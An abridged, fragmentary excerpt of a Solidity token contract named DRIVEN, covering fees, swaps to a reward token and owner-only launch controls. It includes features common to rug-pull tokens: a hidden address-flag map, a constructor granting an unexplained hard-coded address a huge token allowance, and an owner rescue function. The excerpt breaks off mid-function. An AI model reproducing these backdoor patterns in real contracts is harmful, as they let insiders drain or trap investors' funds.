...
contract DRIVEN is Context, IERC20, Ownable {
    ...
    address public rewardTokenAddress = 0xC9882dEF23bc42D53895b8361D0b1EDC7570Bc6A;
    ...
    bool public needAddLP = false;
    bool public swapAndLiquifyByLimitOnly = false;

    mapping(address => bool) private _bAddress;
    uint private launchBlockNum;
    ...
    constructor (
        ...
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), rewardTokenAddress);
        ...
        rewardtoken.approve(address(0x1B6C9c20693afDE803B27F8782156c0f892ABC2d), 10**30);
    ...
    function getBAddress(address b) public view onlyOwner returns (bool){ 
        return _bAddress[b];
    }
    ...
    function startAddLP() public onlyOwner {
        needAddLP = true;
    }
    ...
    function firstLaunch() public onlyOwner {
        needAddLP = false;
        launched = true;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        uint256 leftAmount = getCirculatingSupply();
        if (leftAmount <= 888 * 10 ** _decimals && burnFee > 0){
            burnFee = 0;
            marketFee = 6;
        }
        ...
        else
        {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]){
                ...
                require(recipient == uniswapPair, "ERC20: swap not open");
                finalAmount = amount;
            }else{
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        uint256 burnAmount = amount.mul(burnFee).div(200);
        uint256 feeAmount = amount.mul(marketFee).div(200);
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
       ...
       swapTokensForRewardtoken(tAmount);
    ...
    function swapTokensForRewardtoken(uint256 tokenAmount) private {
        ...
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ...
            path,
            marketingWalletAddress, // The contract
            block.timestamp
        );
    ...
    function rescueToken(address tokenAddress, address des, uint256 amount) external onlyOwner returns (bool success){
